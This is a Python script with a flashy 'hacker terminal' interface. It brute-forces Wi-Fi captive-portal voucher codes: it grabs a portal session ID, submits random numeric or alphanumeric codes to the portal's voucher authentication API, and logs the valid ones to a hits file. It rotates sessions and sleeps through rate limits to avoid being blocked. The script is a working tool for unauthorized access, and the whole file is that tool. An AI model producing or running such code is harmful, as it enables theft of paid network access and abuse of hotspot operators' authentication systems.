# language: Python 3.11, file: v2.py
# *STRAW HAT: Hacker Terminal Edition (Red/Black Theme)*

import os
import time
import json
import random
import string
import sqlite3
import re
import html
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import HEAVY, DOUBLE, ROUNDED, MINIMAL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "scanner_data.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"

API_VERSION = 2

BASE_SLEEP_MIN = 2.0
BASE_SLEEP_MAX = 3.5
RATE_LIMIT_SLEEP = 900
NETWORK_RETRY_SLEEP = 2.0
SESSION_REFRESH_SLEEP = 3
SESSION_ROTATE_EVERY = 15

console = Console()
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
})

# ═══════════════════════════════════════════════════════════════
# 🏴‍☠️ HACKER TERMINAL DESIGN (RED & BLACK)
# ═══════════════════════════════════════════════════════════════

DEV_HANDLE = "@Neovix_Zx"
TG_LINK = "https://t.me/linknyeinchan2006"

STRAW_HAT_LOGO = r"""
[bold red]  ██████╗████████╗██████╗  █████╗ ██╗    ██╗[/bold red]
[bold red]  ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║    ██║[/bold red]
[bold red]  ███████╗   ██║   ██████╔╝███████║██║ █╗ ██║[/bold red]
[bold red]  ╚════██║   ██║   ██╔══██╗██╔══██║██║███╗██║[/bold red]
[bold red]  ██████╔╝   ██║   ██║  ██║██║  ██║╚███╔███╔╝[/bold red]
[bold red]  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ [/bold red]
[bold red]        [ H A T : B L A C K  O P S ][/bold red]
"""

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception: return "00:00:00"

def normalize_hits(hits):
    if not hits: return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception: return None

def is_tried(conn, code):
    if conn is None: return False
    try: return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception: return False

def mark_tried(conn, code):
    if conn is None: return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception: pass

def load_state():
    try:
        with open(STATE_FILE) as f: return json.load(f)
    except Exception: return None

def save_state(mode, tested, hits):
    try:
        with open(STATE_FILE, "w") as f: json.dump({"mode": mode, "tested": tested, "hits": hits}, f)
    except Exception: pass

def clear_state():
    try: os.remove(STATE_FILE)
    except Exception: pass

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception: return None

def fetch_session():
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try: r = session.get(url, timeout=5, allow_redirects=True, verify=False)
        except Exception: continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc: continue
            portal_base = f"{p.scheme}://{p.netloc}"

            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)

            for c in cands:
                sid = extract_session(c)
                if sid: return portal_base, sid

            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=5, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid: return portal_base, sid
            except Exception: pass
        except Exception: continue
    return None, None

def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {
        "Content-Type": "application/json", 
        "Origin": portal_base,
        "Referer": f"{portal_base}/"
    }
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": API_VERSION, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=6, verify=False)
        return r.status_code, r.text if r.text else "__NETWORK_ERROR__"
    except Exception: return 0, "__NETWORK_ERROR__"

def gen_code(mode, length):
    try:
        if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
        if mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
        if mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""

# ═══════════════════════════════════════════════════════════════
# 🏴‍☠️ HACKER UI LAYOUT
# ═══════════════════════════════════════════════════════════════
def make_layout(mode_name, current_code, tested, elapsed, status, session_status, hits, running_logs, speed=0, progress=0.0):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=12),
        Layout(name="main", size=10),
        Layout(name="footer", ratio=1),
    )

    # HEADER
    header_text = Text.assemble(
        (STRAW_HAT_LOGO, "bold red"),
        ("\n[ S Y S T E M   I N F O ]\n", "bold red"),
        (f" DEVELOPER  : {DEV_HANDLE}\n", "bold white"),
        (f" TELEGRAM   : ", "bold white"), (f"{TG_LINK}\n", "bold cyan underline"),
        (f" MODE       : ", "bold white"), (f"{mode_name}\n", "bold yellow"),
        (f" STATUS     : ", "bold white"), 
        ("ONLINE" if status == "Active" else ("LIMIT" if status == "Limit" else "WAITING"), "bold green" if status == "Active" else "bold red")
    )
    layout["header"].update(Panel(Align.center(header_text), border_style="red", box=DOUBLE))

    # MAIN STATS
    stats_table = Table.grid(padding=1, expand=True)
    stats_table.add_column(justify="center", ratio=1)
    stats_table.add_column(justify="center", ratio=1)
    stats_table.add_column(justify="center", ratio=1)
    stats_table.add_column(justify="center", ratio=1)
    
    if session_status == "OK": sess_disp = "[bold green]SECURE[/bold green]"
    elif session_status == "Fetching": sess_disp = "[bold yellow]BYPASSING[/bold yellow]"
    else: sess_disp = "[bold red]FAILED[/bold red]"

    stats_table.add_row(
        f"[bold red]>> VELOCITY <<[/bold red]\n[bold white on red] {speed} / min [/bold white on red]",
        f"[bold red]>> PAYLOADS <<[/bold red]\n[bold white on red] {tested:,} [/bold white on red]",
        f"[bold red]>> UPLINK <<[/bold red]\n[bold white on red] {sess_disp} [/bold white on red]",
        f"[bold red]>> TARGET <<[/bold red]\n[bold white on red] {status.upper()} [/bold white on red]",
    )

    bar_len = 30
    try: filled = int(bar_len * (progress / 100.0))
    except Exception: filled = 0
    filled = max(0, min(bar_len, filled))
    bar = "[bold red]" + "█" * filled + "[/bold red]" + "[dim black]" + "░" * (bar_len - filled) + "[/dim black]"

    main_content = Table.grid(expand=True)
    main_content.add_row(Panel(stats_table, border_style="red", box=HEAVY))
    main_content.add_row(Panel(
        Align.center(
            f"[bold yellow]>> DECRYPTING PAYLOAD: [bold white]{current_code if current_code else 'SCANNING...'}[/bold white] <<[/bold yellow]\n"
            f"{bar} {progress:.4f}%   [bold cyan]UPTIME: {elapsed}[/bold cyan]"
        ),
        border_style="red", box=HEAVY
    ))
    layout["main"].update(main_content)

    # FOOTER (HITS)
    hits_table = Table(show_header=True, header_style="bold white on red", box=HEAVY, expand=True)
    hits_table.add_column("ID", width=5, justify="center", style="bold red")
    hits_table.add_column("EXTRACTED KEY", justify="center", style="bold green")
    hits_table.add_column("TIMESTAMP", justify="center", style="bold white")

    last = hits[-15:]
    base_idx = len(hits) - len(last)
    for idx, h in enumerate(last):
        if isinstance(h, dict):
            c = h.get("code", "")
            t = h.get("time", "--:--:--")
        else:
            c = h
            t = "--:--:--"
        hits_table.add_row(f"#{base_idx + idx + 1}", f"☠ {c} ☠", t)

    if not hits:
        hits_table.add_row("-", "[bold red]NO KEYS EXTRACTED YET...[/bold red]", "-")

    title = f"[bold red]>>> VAULT: DECRYPTED KEYS ({len(hits)} COMPROMISED) <<<[/bold red]"
    layout["footer"].update(Panel(hits_table, title=title, border_style="red", box=DOUBLE))
    return layout

def scan_loop(mode, length, start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()} {length}"

    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()
    portal_base = None
    session_id = None
    net_error_streak = 0
    session_status = "Fetching"
    req_count = 0

    total_target = 10 ** length
    conn = init_db()

    live = None
    live_cm = None
    try:
        initial = make_layout(mode_name, "----", tested, "00:00:00", "--", session_status, hits, running_logs, 0, 0.0)
        live_cm = Live(initial, refresh_per_second=6, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status, sess_status):
        if live is None: return
        try:
            elapsed_s = time.time() - start_time
            speed = int(tested / elapsed_s * 60) if elapsed_s > 0 else 0
            progress = (tested / total_target) * 100.0 if total_target > 0 else 0.0
            live.update(make_layout(mode_name, code, tested, format_time(elapsed_s), status, sess_status, hits, running_logs, speed, progress))
        except Exception: pass

    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[dim]{t_str}[/dim] {msg}")

    try:
        push_log("Straw Hat system set sail. Starting Safe Scanner...")
        while True:
            try:
                if not session_id or not portal_base or (req_count > 0 and req_count % SESSION_ROTATE_EVERY == 0):
                    session_status = "Fetching"
                    _update("----", "--", session_status)
                    portal_base, session_id = fetch_session()
                    
                    if not session_id:
                        session_status = "Error"
                        _update("----", "--", session_status)
                        time.sleep(SESSION_REFRESH_SLEEP)
                        continue
                    
                    session_status = "OK"
                    net_error_streak = 0
                    req_count = 0

                code = gen_code(mode, length)
                if not code: 
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                if is_tried(conn, code): continue

                mark_tried(conn, code)
                tested += 1
                req_count += 1
                save_state(mode_str, tested, hits)

                _update(code, "Active", session_status)

                status_code, res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                if status_code == 0 or res == "__NETWORK_ERROR__" or res == "":
                    net_error_streak += 1
                    time.sleep(NETWORK_RETRY_SLEEP)
                    if net_error_streak >= 10:
                        session_id = None
                        net_error_streak = 0
                    continue

                net_error_streak = 0

                if status_code in (429, 403) or ("request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low):
                    session_status = "Error"
                    _update(code, "Limit", session_status)
                    push_log(f"[red]Rate Limit Hit! Cooling down for 15 mins...[/red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    session_status = "Fetching"
                    continue

                if ("session timed out" in low or "session timeout" in low or '"session":null' in low):
                    session_status = "Fetching"
                    session_id = None
                    continue

                if '"success":true' in low or '"authresult":"1"' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now})
                        push_log(f"[bold green]>>> BREACHED: {code} <<<[/bold green]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{now}] CODE: {code}\n")
                        except Exception: pass
                        save_state(mode_str, tested, hits)
                    _update(code, "Active", session_status)
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))

            except KeyboardInterrupt: raise
            except Exception:
                time.sleep(NETWORK_RETRY_SLEEP)
                continue
    finally:
        if live_cm is not None:
            try: live_cm.__exit__(None, None, None)
            except Exception: pass

def show_banner():
    clear_screen()
    try:
        header = Text.assemble(
            (STRAW_HAT_LOGO, "bold red"),
            ("\n[ SYSTEM INITIALIZATION ]\n", "bold white"),
            (f" DEVELOPER  : {DEV_HANDLE}\n", "bold red"),
            (f" TELEGRAM   : ", "bold red"), (f"{TG_LINK}\n", "bold cyan underline"),
            ("\n[ ! ] UNAUTHORIZED ACCESS IS PROHIBITED [ ! ]\n", "dim red")
        )
        console.print(Panel(Align.center(header), border_style="red", box=DOUBLE))
    except Exception: pass

def ask_mode():
    while True:
        show_banner()
        try:
            console.print(Panel(
                Align.center(Text(">> SELECT PAYLOAD TYPE <<", style="bold white on red")),
                border_style="red", box=HEAVY,
            ))
            console.print()
            console.print("[bold red][1][/bold red] [white]NUMERIC (0-9)[/white]")
            console.print("[bold red][2][/bold red] [white]ALPHABETIC (a-z)[/white]")
            console.print("[bold red][3][/bold red] [white]ALPHANUMERIC (a-z, 0-9)[/white]")
            console.print()
            console.print(Panel(
                Align.center(Text("[0] ABORT MISSION", style="bold red")),
                border_style="red", box=HEAVY,
            ))
            console.print()
            choice = Prompt.ask("[bold red]Target Mode[/bold red]").strip()
        except KeyboardInterrupt: raise
        except Exception: return None

        if choice == "0": return None
        if choice in ("1", "2", "3"):
            return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        clear_screen()
        try:
            console.print(Panel(
                Align.center(Text(f">> SELECT LENGTH : {mode.upper()} <<", style="bold white on red")),
                border_style="red", box=HEAVY,
            ))
            console.print()
            console.print("[bold red][6][/bold red] [white]6 Chars[/white]")
            console.print("[bold red][7][/bold red] [white]7 Chars[/white]")
            console.print("[bold red][8][/bold red] [white]8 Chars[/white]")
            console.print("[bold red][9][/bold red] [white]9 Chars[/white]")
            console.print()
            console.print(Panel(
                Align.center(Text("[0] ABORT MISSION", style="bold red")),
                border_style="red", box=HEAVY,
            ))
            console.print()
            length = Prompt.ask("[bold red]Length[/bold red]").strip()
        except KeyboardInterrupt: raise
        except Exception: return None

        if length == "0": return None
        if length in ("6", "7", "8", "9"): return int(length)

def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            clear_screen()
            console.print(Panel(Align.center(Text(">> RESTORING PREVIOUS SESSION...", style="bold yellow")), border_style="red", box=HEAVY))
            if Confirm.ask(f"[bold red]Continue {m.upper()} {l}? (y/n)[/bold red]", default=True):
                scan_loop(m, int(l), start_tested=tested, start_hits=hits)
                return
            else: clear_state()
        except KeyboardInterrupt: raise
        except Exception: clear_state()

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_loop(mode, length)
        return

def main():
    try:
        run()
    except KeyboardInterrupt: pass
    except BaseException: pass
    finally:
        try: clear_screen()
        except BaseException: pass
        try:
            bye = Text()
            bye.append("\n\n")
            bye.append(">> SYSTEM SHUTDOWN. SIGNAL LOST <<", style="bold red")
            bye.append("\n\n")
            console.print(Align.center(bye))
            time.sleep(2)
        except BaseException:
            try: print("\n\n>> SYSTEM SHUTDOWN. SIGNAL LOST <<")
            except BaseException: pass

if __name__ == "__main__":
    main()
